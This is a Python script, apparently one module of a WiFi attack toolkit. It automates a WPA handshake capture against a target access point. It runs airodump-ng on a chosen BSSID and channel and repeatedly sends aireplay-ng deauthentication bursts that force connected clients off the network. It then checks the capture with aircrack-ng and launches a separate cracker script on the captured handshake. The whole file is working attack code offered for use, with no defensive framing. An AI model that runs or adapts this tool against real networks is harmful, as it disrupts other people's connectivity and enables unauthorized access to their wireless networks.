import subprocess
import sys
import os
import signal
import re
import time

from rich import print
from pyfiglet import figlet_format

print(f"[bold green]{figlet_format('CAPTURE')}[/bold green]")


CHECK_INTERVAL_SECONDS = 5
MAX_CAPTURE_SECONDS = 300

DEAUTH_PACKET_COUNT = 5
DEAUTH_INTERVAL_SECONDS = 15


def clean_folder_name(name):
    name = name.strip()
    name = re.sub(r'[\\/:*?"<>|]', "", name)
    name = re.sub(r"\s+", "_", name)

    if name == "":
        name = "Unknown_Target"

    return name


def get_unique_folder(folder_path):
    if not os.path.exists(folder_path):
        return folder_path

    counter = 1

    while os.path.exists(f"{folder_path}{counter}"):
        counter += 1

    return f"{folder_path}{counter}"


# ===================== HANDSHAKE CHECK START =====================

def has_handshake(cap_file, target_bssid):
    if not os.path.exists(cap_file):
        return False

    if os.path.getsize(cap_file) == 0:
        return False

    try:
        result = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True,
            text=True,
            timeout=15
        )

        output = result.stdout + result.stderr

        for line in output.splitlines():
            if target_bssid.lower() in line.lower() and "handshake" in line.lower():
                if "0 handshake" not in line.lower():
                    return True

        if "wpa (1 handshake)" in output.lower():
            return True

    except subprocess.TimeoutExpired:
        return False

    return False

# ====================== HANDSHAKE CHECK END ======================


# ===================== DEAUTH START =====================

def send_deauth_burst(target_bssid, interface, deauth_log_file):
    print(
        f"[yellow]Sending deauth burst:[/yellow] "
        f"{DEAUTH_PACKET_COUNT} packets"
    )

    with open(deauth_log_file, "a") as log_file:
        try:
            subprocess.run(
                [
                    "sudo", "-n", "aireplay-ng",
                    "--deauth", str(DEAUTH_PACKET_COUNT),
                    "-a", target_bssid,
                    interface
                ],
                stdin=subprocess.DEVNULL,
                stdout=log_file,
                stderr=log_file,
                timeout=20
            )

        except subprocess.TimeoutExpired:
            print("[red]Deauth command timed out.[/red]")

        except FileNotFoundError:
            print("[red]aireplay-ng not found. Install aircrack-ng tools.[/red]")

# ====================== DEAUTH END ======================


# === ADDED: wrapped everything into run_capture() so main.py can call it
#            directly and receive a True/False result back. ===
def run_capture(target_bssid, channel, interface, target_name):
    """
    Runs the full handshake capture + deauth flow.

    Returns True  if a handshake was captured and cracker was launched.
    Returns False if capture timed out or was cancelled with no handshake.
    """

    print(f"[green]Target Name:[/green] {target_name}")
    print(f"[green]Target BSSID:[/green] {target_bssid}")
    print(f"[green]Channel:[/green] {channel}")
    print(f"[green]Monitor Interface:[/green] {interface}")

    # ── Capture folder setup ──────────────────────────────────
    safe_target_name = clean_folder_name(target_name)
    base_capture_folder = os.path.join("captures", safe_target_name)
    capture_folder = get_unique_folder(base_capture_folder)
    os.makedirs(capture_folder, exist_ok=True)

    capture_name   = os.path.join(capture_folder, "capture")
    cap_file       = f"{capture_name}-01.cap"
    error_file     = os.path.join(capture_folder, "error.log")
    deauth_log_file = os.path.join(capture_folder, "deauth.log")

    print(f"[green]Capture Folder:[/green] {capture_folder}")
    print("\n[cyan]Starting handshake capture with deauth...[/cyan]")
    print("[yellow]Capture starts first, then small deauth bursts are sent automatically.[/yellow]")
    print("[yellow]Press CTRL+C if you want to cancel.[/yellow]\n")

    subprocess.run(["sudo", "-v"], check=True)

    error_output = open(error_file, "w")

    capture_process = subprocess.Popen(
        [
            "sudo", "-n", "airodump-ng",
            "--bssid", target_bssid,
            "-c", channel,
            "--write", capture_name,
            interface
        ],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=error_output,
        preexec_fn=os.setsid
    )

    # ── Deauth + handshake wait loop ──────────────────────────
    handshake_found = False
    start_time = time.time()
    last_deauth_time = 0

    time.sleep(2)

    try:
        while True:
            elapsed = int(time.time() - start_time)
            print(f"[cyan]Checking for handshake...[/cyan] {elapsed}s elapsed")

            if has_handshake(cap_file, target_bssid):
                handshake_found = True
                print("\n[bold green]Handshake captured![/bold green]")
                break

            if elapsed - last_deauth_time >= DEAUTH_INTERVAL_SECONDS:
                send_deauth_burst(target_bssid, interface, deauth_log_file)
                last_deauth_time = elapsed

            if MAX_CAPTURE_SECONDS != 0 and elapsed >= MAX_CAPTURE_SECONDS:
                print("\n[red]No handshake captured within the time limit.[/red]")
                break

            time.sleep(CHECK_INTERVAL_SECONDS)

    except KeyboardInterrupt:
        print("\n[yellow]Capture cancelled by user.[/yellow]")

    # ── Stop capture process ──────────────────────────────────
    print("\n[cyan]Stopping capture...[/cyan]\n")

    try:
        os.killpg(os.getpgid(capture_process.pid), signal.SIGINT)
        capture_process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        capture_process.terminate()
        capture_process.wait()

    error_output.close()

    print("[green]Capture stopped.[/green]")
    print(f"[yellow]Files saved in:[/yellow] {capture_folder}")

    if os.path.exists(error_file) and os.path.getsize(error_file) > 0:
        print(f"[yellow]If capture failed, check:[/yellow] {error_file}")

    if os.path.exists(deauth_log_file) and os.path.getsize(deauth_log_file) > 0:
        print(f"[yellow]Deauth log saved at:[/yellow] {deauth_log_file}")

    # ── Launch cracker if handshake was found ─────────────────
    if handshake_found and os.path.exists(cap_file):
        print("\n[cyan]Launching cracker.py automatically...[/cyan]\n")
        subprocess.run(["python3", "cracker.py", cap_file, target_bssid, target_name])
    else:
        print("[yellow]Cracker not started because no handshake was detected.[/yellow]")

    return handshake_found  # === CHANGED: True if handshake found, False if not ===
# === END ADDED ===


# ===================== STANDALONE MODE START =====================
# This block only runs when capture.py is launched directly
# (e.g. python3 capture.py ...) — not when imported by main.py.

if __name__ == "__main__":
    if len(sys.argv) >= 5:
        _bssid     = sys.argv[1]
        _channel   = sys.argv[2]
        _interface = sys.argv[3]
        _name      = sys.argv[4]
    else:
        _bssid     = input("Target BSSID: ").strip()
        _channel   = input("Channel: ").strip()
        _interface = input("Monitor Interface: ").strip()
        _name      = input("Target Name: ").strip()

    run_capture(_bssid, _channel, _interface, _name)

# ====================== STANDALONE MODE END ======================
